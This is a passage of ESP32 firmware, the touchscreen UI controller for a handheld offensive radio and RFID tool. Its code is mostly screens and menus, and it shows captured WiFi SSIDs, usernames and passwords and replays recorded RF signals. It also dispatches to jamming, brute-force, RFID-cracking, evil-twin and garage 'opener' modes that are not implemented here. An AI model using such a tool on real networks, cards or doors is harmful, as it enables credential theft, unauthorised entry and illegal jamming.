static const char* tabDirs[]   = {"/kodi/cc", "/kodi/rec", "/kodi/rfid", "/kodi/wifi", "/kodi/neural"};

void savedLoadTab() {
  sdListFiles(tabDirs[savedTab]);
  deleteConfirm = false;
  deleteIdx = -1;
}

void drawSaved() {
  if (savedNeedLoad) {
    savedLoadTab();
    savedNeedLoad = false;
  }

  tft.fillScreen(C_BG);
  drawHeader("Payloads");

  if (wifiViewActive) {
    tft.setTextSize(2);
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, 65);
    tft.print("WiFi Capture");

    tft.drawLine(10, 90, 310, 90, C_DGREEN);

    tft.setTextSize(1);
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, 105);
    tft.print("SSID:");
    tft.setTextSize(2);
    tft.setCursor(20, 120);
    tft.print(wifiViewSsid[0] ? wifiViewSsid : "(none)");

    tft.setTextSize(1);
    tft.setCursor(20, 155);
    tft.print("USERNAME:");
    tft.setTextSize(2);
    tft.setCursor(20, 170);
    tft.print(wifiViewUser[0] ? wifiViewUser : "(none)");

    tft.setTextSize(1);
    tft.setCursor(20, 205);
    tft.print("PASSWORD:");
    tft.setTextSize(2);
    tft.setCursor(20, 220);
    tft.print(wifiViewPass[0] ? wifiViewPass : "(none)");

    drawBtn(10, 290, 300, 45, "BACK", C_LGRAY, C_BG);
    drawFooter("Tap BACK to return to file list");
    return;
  }

  if (neuralViewActive) {
    tft.setTextSize(2);
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, 65);
    tft.print("Neural Report");
    tft.drawLine(10, 90, 310, 90, C_DGREEN);
    tft.setTextSize(1);
    for (int i = 0; i < neuralViewCount; i++) {
      tft.setTextColor(C_WHITE, C_BG);
      tft.setCursor(14, 96 + i * 28);
      tft.print(neuralViewLines[i]);
    }
    drawBtn(10, 420, 300, 40, "BACK", C_LGRAY, C_BG);
    drawFooter("Saved neural report");
    return;
  }

  for (int i = 0; i < 3; i++)
    drawBtn(10 + i * 100, 52, 95, 34, tabLabels[i], C_LGRAY, C_BG);
  for (int i = 3; i < 5; i++)
    drawBtn(10 + (i - 3) * 152, 90, 147, 34, tabLabels[i], C_LGRAY, C_BG);

  int y = 128;
  int maxVisible = 7;
  tft.setTextSize(1);

  if (fileCount == 0) {
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(20, y + 20); tft.print("(empty)");
    drawFooter("No files in this category");
    return;
  }

  int startIdx = fileScroll;
  int endIdx = min(fileCount, startIdx + maxVisible);

  for (int i = startIdx; i < endIdx; i++) {
    int ry = y + (i - startIdx) * 42;
    bool isDelTarget = (deleteConfirm && deleteIdx == i);

    if (isDelTarget) {
      tft.fillRect(10, ry, 300, 38, C_RED);
      tft.setTextColor(C_WHITE, C_RED);
      tft.setTextSize(1);
      tft.setCursor(20, ry + 4);
      tft.printf("Delete %s ?", fileList[i]);
      drawSmBtn(200, ry + 4, 50, 26, "YES", C_LGRAY);
      drawSmBtn(255, ry + 4, 50, 26, "NO", C_LGRAY);
    } else {
      tft.fillRect(10, ry, 300, 38, C_PANEL);
      tft.setTextColor(C_CYAN, C_PANEL);
      tft.setTextSize(1);
      tft.setCursor(20, ry + 4);
      if (fileNames[i][0]) {
        tft.print(fileNames[i]);
        tft.setTextColor(C_CYAN, C_PANEL);
        tft.setCursor(20, ry + 20);
        tft.print(fileList[i]);
      } else {
        tft.print(fileList[i]);
      }
      if (savedTab != 0) drawSmBtn(255, ry + 6, 50, 24, "DEL", C_LGRAY);
    }
  }

  if (fileCount > maxVisible) {
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(250, y + maxVisible * 42 + 4);
    tft.printf("%d/%d", fileScroll / maxVisible + 1, (fileCount + maxVisible - 1) / maxVisible);
    if (fileScroll > 0) drawSmBtn(140, y + maxVisible * 42, 50, 22, "UP", C_LGRAY);
    if (endIdx < fileCount) drawSmBtn(195, y + maxVisible * 42, 50, 22, "DN", C_LGRAY);
  }

  tft.setTextColor(C_CYAN, C_BG);
  tft.setTextSize(1);
  tft.setCursor(20, 455);
  if (savedTab == 0)
    tft.printf("%d profiles | Tap to load", fileCount);
  else
    tft.printf("%d files | Tap to load, DEL to remove", fileCount);
}

void handleSaved(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54)) {
    if (wifiViewActive) { wifiViewActive = false; clickBack(); needRedraw = true; return; }
    if (neuralViewActive) { neuralViewActive = false; clickBack(); needRedraw = true; return; }
    clickBack(); curScreen = SCR_HOME; needRedraw = true; return;
  }

  if (wifiViewActive) {
    if (inBtn(tx,ty, 10,290, 300,45)) { wifiViewActive = false; clickBack(); needRedraw = true; }
    return;
  }

  if (neuralViewActive) {
    if (inBtn(tx,ty, 10,420, 300,40)) { neuralViewActive = false; clickBack(); needRedraw = true; }
    return;
  }

  for (int i = 0; i < 3; i++) {
    if (inBtn(tx, ty, 10 + i * 100, 52, 95, 34)) {
      if (savedTab != i) { savedTab = i; fileScroll = 0; savedNeedLoad = true; clickNav(); needRedraw = true; }
      return;
    }
  }
  for (int i = 3; i < 5; i++) {
    if (inBtn(tx, ty, 10 + (i - 3) * 152, 90, 147, 34)) {
      if (savedTab != i) { savedTab = i; fileScroll = 0; savedNeedLoad = true; clickNav(); needRedraw = true; }
      return;
    }
  }

  int y = 128;
  int maxVisible = 7;
  int startIdx = fileScroll;
  int endIdx = min(fileCount, startIdx + maxVisible);

  if (fileCount > maxVisible) {
    if (fileScroll > 0 && inBtn(tx, ty, 140, y + maxVisible * 42, 50, 22)) {
      fileScroll -= maxVisible; if (fileScroll < 0) fileScroll = 0;
      clickNav(); needRedraw = true; return;
    }
    if (endIdx < fileCount && inBtn(tx, ty, 195, y + maxVisible * 42, 50, 22)) {
      fileScroll += maxVisible;
      clickNav(); needRedraw = true; return;
    }
  }

  for (int i = startIdx; i < endIdx; i++) {
    int ry = y + (i - startIdx) * 42;

    if (deleteConfirm && deleteIdx == i) {
      if (inBtn(tx, ty, 200, ry + 4, 50, 26)) {
        char path[64];
        snprintf(path, sizeof(path), "%s/%s", tabDirs[savedTab], fileList[i]);
        sdDeleteFile(path);
        clickOk();
        deleteConfirm = false; deleteIdx = -1;
        savedNeedLoad = true;
        needRedraw = true;
        return;
      }
      if (inBtn(tx, ty, 255, ry + 4, 50, 26)) {
        deleteConfirm = false; deleteIdx = -1;
        clickBack(); needRedraw = true;
        return;
      }
      return;
    }

    if (savedTab != 0 && inBtn(tx, ty, 255, ry + 6, 50, 24)) {
      deleteConfirm = true;
      deleteIdx = i;
      clickNav(); needRedraw = true;
      return;
    }

    if (inBtn(tx, ty, 10, ry, 240, 38)) {
      char path[64];
      snprintf(path, sizeof(path), "%s/%s", tabDirs[savedTab], fileList[i]);
      clickOk();

      if (savedTab == 0) {
        if (sdLoadCcProfile(path)) {
          char msg[64];
          if (ccProfileName[0]) snprintf(msg, sizeof(msg), "Loaded: %s", ccProfileName);
          else snprintf(msg, sizeof(msg), "Loaded: %s", fileList[i]);
          drawFooter(msg);
        }
      } else if (savedTab == 1) {
        File f = SD.open(path, FILE_READ);
        if (f) {
          char line[256];
          f.readBytesUntil('\n', line, 255);
          int len = f.readBytesUntil('\n', line, 255); line[len] = '\0';
          while (len > 0 && (line[len-1] == '\r' || line[len-1] == '\n')) line[--len] = '\0';
          char* comma = strchr(line, ',');
          if (comma) {
            *comma = '\0';
            float freq = atof(comma + 1);
            if (freq < 100) freq = atof(line);
            char cmd[256];
            snprintf(cmd, sizeof(cmd), "CC_RECSET,%.2f", freq);
            sendAndWait(cmd, 1000);
            while (f.available()) {
              len = f.readBytesUntil('\n', line, 200); line[len] = '\0';
              while (len > 0 && (line[len-1] == '\r' || line[len-1] == '\n')) line[--len] = '\0';
              if (len > 0) {
                snprintf(cmd, sizeof(cmd), "CC_RECADD,%s", line);
                sendAndWait(cmd, 1000);
              }
            }
            sendAndWait("CC_RECDONE", 1000);
            drawFooter("Recording loaded for replay");
          }
          f.close();
        }
      } else if (savedTab == 2) {
        if (sdLoadRfid(path)) {
          char msg[64];
          if (rfidName[0]) snprintf(msg, sizeof(msg), "RFID: %s (%s)", rfidName, rfidUid);
          else snprintf(msg, sizeof(msg), "RFID UID: %s", rfidUid);
          drawFooter(msg);
        }
      } else if (savedTab == 3) {
        File f = SD.open(path, FILE_READ);
        if (f) {
          char line[128];
          wifiViewSsid[0] = '\0'; wifiViewUser[0] = '\0'; wifiViewPass[0] = '\0';
          while (f.available()) {
            int len = f.readBytesUntil('\n', line, 127); line[len] = '\0';
            while (len > 0 && (line[len-1] == '\r' || line[len-1] == '\n')) line[--len] = '\0';
            if (strncmp(line, "ssid=", 5) == 0) strlcpy(wifiViewSsid, line+5, 33);
            else if (strncmp(line, "user=", 5) == 0) strlcpy(wifiViewUser, line+5, 65);
            else if (strncmp(line, "pass=", 5) == 0) strlcpy(wifiViewPass, line+5, 65);
          }
          f.close();
          wifiViewActive = true;
          needRedraw = true;
        }
      } else if (savedTab == 4) {
        File f = SD.open(path, FILE_READ);
        if (f) {
          neuralViewCount = 0;
          char line[80];
          int len;
          for (int skip = 0; skip < 3 && f.available(); skip++) {
            len = f.readBytesUntil('\n', line, 79); line[len] = '\0';
          }
          while (f.available() && neuralViewCount < 12) {
            len = f.readBytesUntil('\n', line, 79);
            line[len] = '\0';
            while (len > 0 && (line[len-1] == '\r' || line[len-1] == '\n')) line[--len] = '\0';
            if (len > 0) {
              strlcpy(neuralViewLines[neuralViewCount], line, 56);
              neuralViewCount++;
            }
          }
          f.close();
          neuralViewActive = true;
          needRedraw = true;
        }
      }
      return;
    }
  }
}

// ═══════════════════════════════════════════════════════════
//  SCREEN: SETTINGS
// ═══════════════════════════════════════════════════════════

void drawSettings() {
  tft.fillScreen(C_BG);
  drawHeader("Settings");

  int y = 55;
  tft.setTextSize(2);

  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(20, y); tft.print("Volume:");
  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(150, y); tft.printf("%d", volume);
  drawBtn(210, y-6, 46, 32, "-", C_LGRAY, C_BG); drawBtn(262, y-6, 46, 32, "+", C_LGRAY, C_BG);
  y += 38;

  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(20, y); tft.print("Bright:");
  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(150, y); tft.printf("%d", brightness);
  drawBtn(210, y-6, 46, 32, "-", C_LGRAY, C_BG); drawBtn(262, y-6, 46, 32, "+", C_LGRAY, C_BG);
  y += 38;

  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(20, y); tft.print("Node 0:");
  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(150, y);
  tft.print(node0Ok ? "Connected" : "OFFLINE");
  drawBtn(260, y-6, 56, 32, "PING", C_LGRAY, C_BG);
  y += 35;

  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(20, y); tft.print("SD Card:");
  tft.setTextColor(C_CYAN, C_BG); tft.setCursor(150, y);
  tft.print(sdOk ? "OK" : "MISSING");
  y += 35;

  drawBtn(10, 230, 145, 45, "RE-CALIB", C_LGRAY, C_BG);
  drawBtn(165, 230, 145, 45, "REBOOT", C_LGRAY, C_BG);

  drawFooter("System settings");
}

void handleSettings(int tx, int ty) {
  if (inBtn(tx,ty, 200,0, 120,54)) { clickBack(); curScreen = SCR_HOME; needRedraw = true; return; }

  int y = 55;
  if (inBtn(tx,ty, 210,y-6, 46,32)) { if (volume > 0) volume--; clickNav(); needRedraw = true; }
  if (inBtn(tx,ty, 262,y-6, 46,32)) { if (volume < 10) volume++; clickNav(); needRedraw = true; }
  y += 38;
  if (inBtn(tx,ty, 210,y-6, 46,32)) {
    if (brightness > 20) brightness -= 20;
    analogWrite(LCD_BL, brightness); clickNav(); needRedraw = true;
  }
  if (inBtn(tx,ty, 262,y-6, 46,32)) {
    if (brightness < 255) brightness += 20;
    if (brightness > 255) brightness = 255;
    analogWrite(LCD_BL, brightness); clickNav(); needRedraw = true;
  }
  y += 38;
  if (inBtn(tx,ty, 260,y-6, 56,32)) {
    clickOk();
    sendCmd("PING");
    node0Ok = waitReply(1000) && strncmp(rspBuf, "PONG", 4) == 0;
    needRedraw = true;
  }
  if (inBtn(tx,ty, 10,230, 145,45)) { clickOk(); doCalibration(); curScreen = SCR_SETTINGS; needRedraw = true; }
  if (inBtn(tx,ty, 165,230, 145,45)) { clickOk(); ESP.restart(); }
}

// ═══════════════════════════════════════════════════════════
//  NEURAL REPORT SCREEN
// ═══════════════════════════════════════════════════════════

void drawNeural() {
  tft.fillScreen(C_BG);
  tft.setTextColor(C_CYAN, C_BG);
  tft.setTextSize(2);
  tft.setCursor(60, 10);
  tft.print("KODI Neural");

  tft.drawLine(10, 34, 310, 34, C_CYAN);

  uint32_t sess = (millis() - nnSessionStart) / 1000;
  uint32_t heap = ESP.getFreeHeap();

  tft.setTextSize(1);
  tft.setTextColor(C_CYAN, C_BG);

  int y = 40;
  tft.setCursor(10, y);
  tft.printf("Session %lum%lus | Ops %lu | Heap %luK", sess/60, sess%60, nnTotalOps, heap/1024);
  y += 11;
  tft.setCursor(10, y);
  tft.printf("Link %.0f%% | Lat %.0fms | Tmout %lu", nnLinkSuccess*100, nnLinkLatency, nnLinkTimeouts);
  y += 11;
  if (nnLearnerLoaded && nnLearner.totalSessions > 0) {
    tft.setCursor(10, y);
    tft.printf("Lifetime: %lu sessions %lu ops", nnLearner.totalSessions, nnLearner.lifetimeOps);
    y += 11;
  }

  tft.drawLine(10, y+2, 310, y+2, C_DGRAY);
  y += 6;

  if (nnRecCount > 0) {
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(10, y);
    tft.print("-- Insights --");
    y += 11;
    for (int i = 0; i < nnRecCount && i < 3; i++) {
      tft.setCursor(10, y);
      tft.print(nnRecs[i]);
      y += 11;
    }
    tft.drawLine(10, y+2, 310, y+2, C_DGRAY);
    y += 6;
  }

  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(10, y);
  tft.print("-- Operations --");
  y += 11;

  int statLines = 0;
  for (int i = 0; i < NN_OP_COUNT && statLines < 5; i++) {
    if (nnStats[i].uses > 0) {
      float risk = nnComputeRisk((NnOp)i);
      const char* riskTag = (risk > 60) ? "[!!]" : (risk > 30) ? "[!]" : "[OK]";
      tft.setCursor(10, y);
      tft.printf("%-10s %3lu/%3lu %.0fms %s",
        nnOpNames[i], nnStats[i].successes, nnStats[i].uses, nnStats[i].avgRespMs, riskTag);
      if (nnLearnerLoaded && nnLearner.opAvgMs[i] > 0) {
        float drift = nnStats[i].avgRespMs - nnLearner.opAvgMs[i];
        if (drift > 50 || drift < -50) {
          tft.printf(" %+.0f", drift);
        }
      }
      y += 11;
      statLines++;
    }
  }

  if (statLines == 0) {
    tft.setCursor(10, y);
    tft.print("No operations recorded yet");
    y += 11;
  }

  tft.drawLine(10, y+2, 310, y+2, C_DGRAY);
  y += 6;

  tft.setTextColor(C_CYAN, C_BG);
  tft.setCursor(10, y);
  tft.printf("-- Events (%d) --", nnRptCount);
  y += 11;

  int showMax = (430 - y) / 11;
  if (showMax < 1) showMax = 1;
  if (showMax > 14) showMax = 14;

  int start = nnRptCount - 1 - nnRptScroll;
  int shown = 0;
  for (int i = start; i >= 0 && shown < showMax; i--) {
    int idx = (nnRptHead - nnRptCount + i + NN_RPT_MAX) % NN_RPT_MAX;
    NnReportEntry& e = nnReports[idx];
    const char* sev = (e.severity == NN_SEV_ALERT) ? "! " :
                      (e.severity == NN_SEV_WARN)  ? "* " : "  ";
    tft.setCursor(10, y);
    tft.printf("%s%s", sev, e.msg);
    y += 11;
    shown++;
  }

  tft.setTextColor(C_LGRAY, C_BG);
  if (nnRptScroll > 0) { tft.setCursor(280, 40); tft.print("^ UP"); }
  if (start - showMax >= 0) { tft.setCursor(270, 430); tft.print("v DN"); }

  drawBtn(10,  440, 145, 35, "Save Report", C_CYAN, C_BG);
  drawBtn(165, 440, 145, 35, "Back",        C_LGRAY, C_BG);
}

void handleNeural(int tx, int ty) {
  if (inBtn(tx,ty, 10,440,145,35)) {
    clickOk();
    nnSaveReport();
    needRedraw = true;
    return;
  }
  if (inBtn(tx,ty, 165,440,145,35)) {
    clickOk();
    curScreen = SCR_HOME;
    needRedraw = true;
    return;
  }
  if (ty < 240 && tx > 250) {
    if (nnRptScroll > 0) { nnRptScroll--; needRedraw = true; }
  } else if (ty > 400 && ty < 440 && tx > 250) {
    if (nnRptScroll < nnRptCount - 1) { nnRptScroll++; needRedraw = true; }
  }
}

// ═══════════════════════════════════════════════════════════
//  MAIN UI DISPATCH
// ═══════════════════════════════════════════════════════════

void uiDraw() {
  if (!needRedraw) return;
  needRedraw = false;
  switch (curScreen) {
    case SCR_HOME:     drawHome(); break;
    case SCR_RFID:     drawRfid(); break;
    case SCR_CC_TX:    drawCcTx(); break;
    case SCR_SUBGHZ:   drawSubGhz(); break;
    case SCR_SCAN:     drawScan(); break;
    case SCR_RSSI_MON: drawRssiMon(); break;
    case SCR_RECORD:   drawRecord(); break;
    case SCR_REPLAY:   drawReplay(); break;
    case SCR_JAM:      drawJam(); break;
    case SCR_BRUTE:    drawBrute(); break;
    case SCR_CW:       drawCw(); break;
    case SCR_WIFI:     drawWifi(); break;
    case SCR_EVIL:     drawEvil(); break;
    case SCR_RFID_CRACK:  drawRfidCrack(); break;
    case SCR_CC_AUTOSCAN: drawAutoScan(); break;
    case SCR_KEYBOARD:    drawKeyboard(); break;
    case SCR_SAVED:       drawSaved(); break;
    case SCR_SETTINGS:    drawSettings(); break;
    case SCR_OPENER:      drawOpener(); break;
    case SCR_OPENER_PICK: drawOpenerPick(); break;
    case SCR_NEURAL:      drawNeural(); break;
    default: break;
  }
}

void uiTouch() {
  uint16_t tx, ty;
  if (!tft.getTouch(&tx, &ty)) return;
  uint32_t debounce = (curScreen == SCR_KEYBOARD) ? 120 : 250;
  if (millis() - lastTouch < debounce) return;
  lastTouch = millis();

  switch (curScreen) {
    case SCR_HOME:     handleHome(tx, ty); break;
    case SCR_RFID:     handleRfid(tx, ty); break;
    case SCR_CC_TX:    handleCcTx(tx, ty); break;
    case SCR_SUBGHZ:   handleSubGhz(tx, ty); break;
    case SCR_SCAN:     handleScan(tx, ty); break;
    case SCR_RSSI_MON: handleRssiMon(tx, ty); break;
    case SCR_RECORD:   handleRecord(tx, ty); break;
    case SCR_REPLAY:   handleReplay(tx, ty); break;
    case SCR_JAM:      handleJam(tx, ty); break;
    case SCR_BRUTE:    handleBrute(tx, ty); break;
    case SCR_CW:       handleCw(tx, ty); break;
    case SCR_WIFI:     handleWifi(tx, ty); break;
    case SCR_EVIL:     handleEvil(tx, ty); break;
    case SCR_RFID_CRACK:  handleRfidCrack(tx, ty); break;
    case SCR_CC_AUTOSCAN: handleAutoScan(tx, ty); break;
    case SCR_KEYBOARD:    handleKeyboard(tx, ty); break;
    case SCR_SAVED:       handleSaved(tx, ty); break;
    case SCR_SETTINGS:    handleSettings(tx, ty); break;
    case SCR_OPENER:      handleOpener(tx, ty); break;
    case SCR_OPENER_PICK: handleOpenerPick(tx, ty); break;
    case SCR_NEURAL:      handleNeural(tx, ty); break;
    default: break;
  }
}

void uiUpdate() {
  switch (curScreen) {
    case SCR_RECORD: updateRecord(); break;
    case SCR_BRUTE:  updateBrute(); break;
    default: break;
  }
  updateEvil();
  updateRfidCrack();
  updateOpener();
  if (evilTwinActive && curScreen == SCR_EVIL) {
    static uint32_t lastEvilRedraw = 0;
    if (millis() - lastEvilRedraw > 1000) { needRedraw = true; lastEvilRedraw = millis(); }
  }
}

// ═══════════════════════════════════════════════════════════
//  SETUP
// ═══════════════════════════════════════════════════════════

void setup() {
  Serial.begin(115200);
  delay(200);
  Serial.println(F("\n=== KODI NODE 1 — UI Controller ==="));

  // Set LA Pacific timezone (auto DST)
  configTime(0, 0, "pool.ntp.org");
  setenv("TZ", "PST8PDT,M3.2.0,M11.1.0", 1);
  tzset();

  pinMode(0, INPUT_PULLUP);

  // Backlight
  pinMode(LCD_BL, OUTPUT);
  analogWrite(LCD_BL, brightness);

  // Speaker (amp enable is active-LOW on R40T)
  pinMode(SPK_EN, OUTPUT);
  digitalWrite(SPK_EN, LOW);

  // RGB LED
  pinMode(LED_R, OUTPUT); pinMode(LED_G, OUTPUT); pinMode(LED_B, OUTPUT);
  ledCyan();

  // Init I2C + OLED
  Wire.begin(I2C_SDA, I2C_SCL);
  oledOk = oled.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  if (oledOk) {
    oled.clearDisplay();
    oled.setTextColor(SSD1306_WHITE);
    oled.setTextSize(5);
    oled.setCursor(4, 12);
    oled.print(F("KODI"));
    oled.display();
    Serial.println(F("OLED: OK"));
  } else {
    Serial.println(F("OLED: not found"));
  }

  // Init SD (before boot animation)
  sdInit();
  Serial.printf("SD Card: %s\n", sdOk ? "OK" : "FAIL");

  // Init display — portrait mode
  tft.init();
  tft.setRotation(0);
  tft.fillScreen(C_BG);

  // Boot animation from SD card
  drawBoot();
  toneBeep(1500, 100);

  // ESP-NOW
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  espNowSetup();

  // Ping Node 0 over ESP-NOW
  sendCmd("PING");
  if (waitReply(3000) && strncmp(rspBuf, "PONG", 4) == 0) {
    node0Ok = true;
    ledGreen();
    Serial.println(F("Node 0: Connected via ESP-NOW"));
    sendCmd("STATUS");
    if (waitReply(2000) && strncmp(rspBuf, "ST,", 3) == 0) {
      pn532Ok   = (rspBuf[3] == '1');
      cc1101aOk = (rspBuf[5] == '1');
      cc1101bOk = (rspBuf[7] == '1');
    }
  } else {
    Serial.println(F("Node 0: OFFLINE (will retry in background)"));
    ledRed();
  }

  // Neural layer init (after SD + ESP-NOW are ready)
  nnInit();

  // Touch calibration — load from SD or run full calibration
  if (!loadCalFromSd()) {
    doCalibration();
  }
  toneBeep(2000, 50);
  delay(100);
  toneBeep(2500, 50);

  // Go to home screen
  curScreen = SCR_HOME;
  needRedraw = true;
  ledOff();

  Serial.println(F("Ready.\n"));
}

// ═══════════════════════════════════════════════════════════
//  LOOP
// ═══════════════════════════════════════════════════════════

void ledTriggerFlash(bool r, bool g, bool b, uint32_t ms) {
  ledFlashR = r; ledFlashG = g; ledFlashB = b;
  ledFlashUntil = millis() + ms;
  ledSet(r, g, b);
}

void ledUpdate() {
  static uint32_t lastLedCheck = 0;
  static uint8_t lastR = 0, lastG = 0, lastB = 0;
  uint32_t now = millis();

  if (ledFlashUntil && now < ledFlashUntil) return;
  if (ledFlashUntil) { ledFlashUntil = 0; }

  if (now - lastLedCheck < 100) return;
  lastLedCheck = now;

  uint8_t r = 0, g = 0, b = 0;

  if (jamActive || cwActive)               { r = 1; }
  else if (bfActive || openerRunning)      { r = (now / 300) & 1; }
  else if (crackActive || evilTwinActive)  { r = 1; b = 1; }
  else if (recActive || autoScanActive)    { b = 1; }

  if (r != lastR || g != lastG || b != lastB) {
    ledSet(r, g, b);
    lastR = r; lastG = g; lastB = b;
  }
}

void loop() {
  if (openerStep == 0) checkAsync();
  uiTouch();
  uiDraw();
  uiUpdate();
  nnTick();
  ledUpdate();
  oledUpdate();
  yield();
}
